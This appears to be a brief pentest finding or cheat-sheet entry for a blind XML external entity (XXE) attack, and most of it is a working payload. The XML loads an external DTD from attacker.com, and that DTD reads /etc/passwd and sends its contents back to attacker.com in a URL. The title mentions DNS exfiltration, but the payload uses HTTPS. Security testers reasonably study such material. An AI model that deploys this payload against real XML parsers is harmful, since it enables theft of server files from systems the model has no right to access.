title: Blind XXE via OOB DNS exfiltration
desc: XML parser processed external entities but response not reflected. Used OOB DNS to exfiltrate file contents.
steps:
1. Inject XXE with OOB payload
2. File contents sent to attacker DNS server
3. Capture data in DNS logs
payload:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<root/>

# evil.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'https://attacker.com/?d=%file;'>">
%oob;
